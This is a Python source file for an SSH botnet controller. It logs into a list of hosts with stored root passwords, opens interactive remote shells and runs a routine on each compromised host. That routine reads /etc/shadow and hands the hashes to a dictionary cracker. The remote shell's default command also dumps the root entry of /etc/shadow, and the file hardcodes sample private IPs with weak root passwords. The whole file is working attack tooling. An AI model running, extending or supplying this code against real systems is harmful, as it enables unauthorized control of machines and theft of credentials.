#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import json
import optparse
import threading
import pexpect
from pexpect import pxssh

import global_var as gv
import brute.bruteUnixPasswd as bruteUnixPasswd


class BotClient:
    LOGIN = 'Last login'
    SHELL = 'bash'
    PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']
    TIMEOUT = 5

    def __init__(self, host, user, *, ssh_type='password', key=None):
        """

        :param host:
        :param user:
        :param ssh_type:
        :param key:
        """
        self.host = host
        self.user = user

        self.ssh_type = ssh_type
        if self.ssh_type == 'password':
            self.passwd = key
        else:
            self.keyfile = key

        self.session = None
        self.connected = False

        self.password_json = None

    def __str__(self):
        host_str = '[+]host: ' + self.host + '\n'
        user_str = '[+]user: ' + self.user + '\n'
        type_str = '[+]type: ' + self.ssh_type + '\n'
        key_str = '[+]password: ' + self.passwd + '\n'

        return host_str + user_str + type_str + key_str + '\n'

    def close(self):
        """关闭连接"""
        self.session.close()
        self.connected = not self.session.closed

    def send_command_pexpect(self, cmd):
        """pexpect 通过ssh发送命令，返回信息"""
        self.session.sendline(cmd)
        self.session.expect(BotClient.PROMPT)
        return str(self.session.before, encoding="utf-8")[len(cmd) + 2:]

    def trans_passwd_pexpect(self, passwd):
        """pexpect 测试ssh密码 """
        try:
            self.session.sendline(passwd)
            ret = self.session.expect([pexpect.TIMEOUT, BotClient.LOGIN, '[P|p]assword'])
            if ret == 0:
                print('[-] Time out.')
            elif ret == 1:
                self.session.sendline(BotClient.SHELL)
                self.session.expect(BotClient.PROMPT)
                self.connected = not self.session.closed
            elif ret == 2:
                print('[-] Wrong password.')
            else:
                print('[-] Unknown error.')
        except Exception as e:
            print('[-]', e)

    def login_ssh_pexpect(self, passwd):
        """pexpect建立与目标主机连接，尝试登录"""
        ssh_newkey = 'Are you sure you want to continue connecting'
        ret = self.session.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
        if ret == 0:
            print("[-] Error Connecting")
        elif ret == 1:
            self.session.sendline('yes')
            ret = self.session.expect([pexpect.TIMEOUT, '[P|p]assword'])
            if ret == 0:
                print("[-] Error Connecting")
            else:
                self.trans_passwd_pexpect(passwd)
        elif ret == 2:
            self.trans_passwd_pexpect(passwd)

    def com_ssh_pexpect(self, command='whoami && pwd'):
        """pexpect ssh发送命令"""
        try:
            while command != "exit":
                response = self.send_command_pexpect(command)
                print(response, end='')
                command = input()
        except KeyboardInterrupt as e:
            print('\n[-] Error: KeyboardInterrupt', e)
        except Exception as e:
            print('[-] Error:', e)
        finally:
            self.close()

    def connect_pexpect(self, host, user, passwd):
        """pexpect 连接

        :param host: 目标主机
        :param user: 目标用户
        :param passwd: 登录密码
        :return: 登录句柄 登录失败返回None
        """
        ssh_connect = 'ssh ' + user + '@' + host
        try:
            self.session = pexpect.spawn(ssh_connect, timeout=BotClient.TIMEOUT)
            # fout = open('mylog.txt', 'wb')
            # child.logfile = fout
            self.login_ssh_pexpect(passwd)
        except Exception as e:
            print('[-] Error:', e)
        finally:
            return self.connected

    def send_command(self, cmd):
        """pxssh 发送命令，返回信息"""
        self.session.sendline(cmd)
        self.session.prompt()
        ret = self.session.before.split('\n', 1)[1].strip().strip('\r')
        # ret = str(s.before, encoding="utf-8").split('\n', 1)[1].strip()#[len(cmd):]
        return ret

    def com_ssh_realtime(self, command='cat /etc/shadow|grep root'):
        """pxssh ssh发送命令，实时回应"""
        try:
            while command != "exit":
                response = self.send_command(command)
                print(response)
                # print(self.user + '@' + self.host + '#', end='')
                print('Bot#', end='')
                command = input()
        except KeyboardInterrupt as e:
            print('\n[-] Error: KeyboardInterrupt', e)
        except Exception as e:
            print('\n[-] Error:', e)
        finally:
            self.session.logout()
            self.close()

    def connect(self, host=None, user=None, passwd=None):
        """pxssh密码连接ssh

        :param host:目标主机
        :param user:目标用户
        :param passwd:密码
        :return: 连接结果
        """
        if host is None and user is None and passwd is None:
            host = self.host
            user = self.user
            passwd = self.passwd

        try:
            self.session = pxssh.pxssh(encoding='utf-8')
            self.session.login(host, user, passwd)
            self.connected = not self.session.closed
        except Exception as e:
            print('\n[-] Connect Failed.')
            print('[-] Error:', e)
        finally:
            return self.connected

    def login_ssh(self, login_info):
        """接受字典格式登录信息

        :param login_info: 登录信息字典格式{'host': '1.2.3.4', 'user': 'root', 'ssh_type': 'password', 'key': None}
        :return: Bool类型连接结果
        """
        if login_info['ssh_type'] == 'password' and login_info['key'] is not None:
            self.connect(login_info['ip'], login_info['user'], login_info['key'])
            # self.connect_pexpect(login_info['ip'], login_info['user'], login_info['key'])

        # com_ssh_realtime(child)

        return self.connected

    def get_unix_passwdfile(self):
        """获取密码文件

        :return: 密码文件内容
        """
        cmd_getpass = 'cat /etc/shadow'
        passwd_file_info = self.send_command(cmd_getpass)
        return passwd_file_info

    def crack_unix_passwd(self, passwd_file_info):
        self.password_json = bruteUnixPasswd.crack_bot_unix_passwd(ip=self.host, passwd_file_info=passwd_file_info,
                                                                   dic=gv.PASS_DICTIONARY)

    def standard_operate(self):
        """肉鸡标准操作

        :return:
        """
        if self.connected is False:
            return

        # 获取unix密码
        passwd_file_info = self.get_unix_passwdfile()
        t = threading.Thread(target=self.crack_unix_passwd, args=(passwd_file_info,))

        self.close()
        t.start()
        t.join()


class BotNet:
    def __init__(self):
        self.botnet = []

    def __str__(self):
        string = '[+]Bot info:' + '\n'
        for bot in self.botnet:
            string += str(bot)

        return string

    def add_bot(self, host, user, *, ssh_type='password', key=None):
        bot = BotClient(host=host, user=user, ssh_type=ssh_type, key=key)
        self.botnet.append(bot)

    def net_connect(self):
        for bot in self.botnet:
            if bot.connected is False:
                bot.connect()
            print('Connect ', bot.host, ' ', bot.connected)

    def net_close(self):
        for bot in self.botnet:
            if bot.connected is True:
                bot.close()
            print('Connect ', bot.host, ' ', bot.connected)

    def bot_connect(self):
        pass

    def bot_close(self):
        pass

    def operate_net(self):
        pass

    def operate_onebyone(self):
        for bot in self.botnet:
            if bot.connected is True:
                self.opreate_bot(bot)

    def opreate_bot(self, bot):
        print(bot.send_command('pwd'))

    def getbot_by_file(self, file):
        with open(file, 'r') as botfile:
            botnet_info = json.load(botfile)
            for bot in botnet_info:
                host = botnet_info[bot]['ip']
                account = botnet_info[bot]['account']
                user = 'root' if 'root' in account else list(account.keys())[0]
                passwd = botnet_info[bot]['account'][user]['password']

                self.add_bot(host=host, user=user, key=passwd)


def main():
    """单独调用时的入口函数"""
    parser = optparse.OptionParser('usage %prog ' + '-H <target host> -u <user> -p <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-p', dest='passwd', type='string', help='specify password')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    user = options.user
    passwd = options.passwd

    if host is None or passwd is None or user is None:
        print(parser.usage)
        exit(0)

    client = BotClient(host, user, ssh_type='password', key=passwd)
    client.connect()
    # print(client.connected)
    client.com_ssh_realtime()
    client.close()


if __name__ == "__main__":
    net = BotNet()
    # net.getbot_by_file('/root/h/data/hData/bot/10.108.101mask24.txt')
    net.add_bot(**{'host': '10.108.101.111', 'user': 'root', 'key': '123456'})
    net.add_bot(**{'host': '10.108.103.215', 'user': 'root', 'key': '123456789'})
    print(net)
    # net.net_connect()
    # net.operate_onebyone()
    # net.net_close()

    # client = BotClient(**{'host': '10.108.101.111', 'user': 'root', 'key': '123456'})
    # client.connect()
    # print(client.connected)
    # client.com_ssh_realtime()
    # client.close()
    # print(client.connected)

    # main()
